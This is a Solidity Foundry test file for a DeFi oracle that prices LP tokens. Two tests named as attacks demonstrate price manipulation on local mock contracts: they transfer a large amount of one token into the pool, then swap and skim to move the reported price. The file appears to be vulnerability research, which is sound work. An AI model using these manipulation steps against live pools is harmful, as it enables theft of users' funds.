// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {OracleDemo} from "src/OracleDemo.sol";
import {MockERC20} from "src/MockERC20.sol";
import {Pool} from "src/Pool.sol";

contract OracleTest is Test {
    function testDemoOracle() public {
        OracleDemo oracle = new OracleDemo();
        // We'll assume that they are priced at 1:1
        MockERC20 tokenA = new MockERC20();
        MockERC20 tokenB = new MockERC20();

        Pool pool = new Pool();
        // Classic unstable Pool
        pool.initialize(address(tokenA), address(tokenB), false);

        // Set the pool at 1:1
        tokenA.transfer(address(pool), 1e18);
        tokenB.transfer(address(pool), 1e18);

        pool.mint(address(this));

        console.log("pool.balanceOf(address(this))", pool.balanceOf(address(this)));

        uint256 totalSupply = pool.totalSupply();
        // From oracle
        uint256 price0 = 1e18;
        uint256 price1 = 1e18;

        uint256 reserve0 = pool.reserve0();
        uint256 reserve1 = pool.reserve1();


        // // 2 brute force way

        // // Deploy a pool with tokens
        // // Swap stufs
        // // See whether we can make the price change

        

        console2.log(
            "calculate_lp_token_price",
            oracle.calculate_lp_token_price(totalSupply, price0, price1, reserve0, reserve1)
        );
    }

    function testDemoOracleAttack() public {
        OracleDemo oracle = new OracleDemo();
        // We'll assume that they are priced at 1:1
        MockERC20 tokenA = new MockERC20();
        MockERC20 tokenB = new MockERC20();

        Pool pool = new Pool();
        // Classic unstable Pool
        pool.initialize(address(tokenA), address(tokenB), false);

        // Set the pool at 1:1
        tokenA.transfer(address(pool), 1000e18);
        tokenB.transfer(address(pool), 1000e18);

        pool.mint(address(this));

        console.log("pool.balanceOf(address(this))", pool.balanceOf(address(this)));

        tokenA.transfer(address(pool), 1_000e18);
        pool.swap(0, 1e18 * 99 / 100, address(this), hex"");
        pool.skim(address(this));

        uint256 totalSupply = pool.totalSupply();
        // From oracle
        uint256 price0 = 1e18;
        uint256 price1 = 1e18;

        uint256 reserve0 = pool.reserve0();
        uint256 reserve1 = pool.reserve1();


        // // 2 brute force way

        // // Deploy a pool with tokens
        // // Swap stufs
        // // See whether we can make the price change

        console2.log(
            "calculate_lp_token_price",
            oracle.calculate_lp_token_price(totalSupply, price0, price1, reserve0, reserve1)
        );
    }
    function testDemoOracleAttackStable() public {
        OracleDemo oracle = new OracleDemo();
        // We'll assume that they are priced at 1:1
        MockERC20 tokenA = new MockERC20();
        MockERC20 tokenB = new MockERC20();

        Pool pool = new Pool();
        // Classic unstable Pool
        pool.initialize(address(tokenA), address(tokenB), false);

        // Set the pool at 1:1
        tokenA.transfer(address(pool), 1000e18);
        tokenB.transfer(address(pool), 1000e18);

        pool.mint(address(this));

        console.log("pool.balanceOf(address(this))", pool.balanceOf(address(this)));

        tokenA.transfer(address(pool), 1_000000e18);
        pool.swap(0, 1e18 * 99 / 100, address(this), hex"");
        pool.skim(address(this));

        uint256 totalSupply = pool.totalSupply();
        // From oracle
        uint256 price0 = 1e18;
        uint256 price1 = 1e18;

        uint256 reserve0 = pool.reserve0();
        uint256 reserve1 = pool.reserve1();


        // // 2 brute force way

        // // Deploy a pool with tokens
        // // Swap stufs
        // // See whether we can make the price change

        console2.log(
            "calculate_lp_token_price",
            oracle.calculate_lp_token_price(totalSupply, price0, price1, reserve0, reserve1)
        );


        uint256 price = oracle.calculate_lp_token_price(totalSupply, price0, price1, reserve0, reserve1);


        uint256 balB4 = pool.balanceOf(address(this));
        uint256 snapshot = vm.snapshot();
        tokenA.transfer(address(pool), 2826673306202894044);
        tokenB.transfer(address(pool), 2826673306202894044);

        pool.mint(address(this));
        uint256 balAfter = pool.balanceOf(address(this));
        uint256 change = balAfter - balB4;
        console2.log("change", change);
    }
}
